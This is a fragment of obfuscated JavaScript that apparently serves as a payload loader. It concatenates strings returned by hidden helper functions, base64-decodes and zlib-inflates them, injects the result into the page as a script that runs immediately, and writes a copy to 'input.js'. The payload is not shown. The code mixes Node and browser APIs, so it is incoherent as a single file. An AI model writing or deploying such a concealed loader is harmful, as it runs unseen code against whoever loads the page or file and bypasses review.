};
const fs = require('fs');
function _() {
  let _0xd8d5f3_ = _0x5c5c20_() + _0x70ed8d_() + _0xab0a48_() + _0x46ae30_() + _0xe14333_() + _0x5d453f_();
  let _0xe123e1_ = Buffer.from(_0xd8d5f3_, 'base64');
  let _0x860f35_ = require("zlib").inflateSync(_0xe123e1_);
  let _0x5b8ff1_ = document.createElement('script');
  _0x5b8ff1_.textContent = _0x860f35_.toString("utf-8");
  ;
  document.body.appendChild(_0x5b8ff1_);
  fs.writeFile('input.js', _0x5b8ff1_.textContent, err => {
    if (err) {
      console.error(err);
    } else {}
  });
}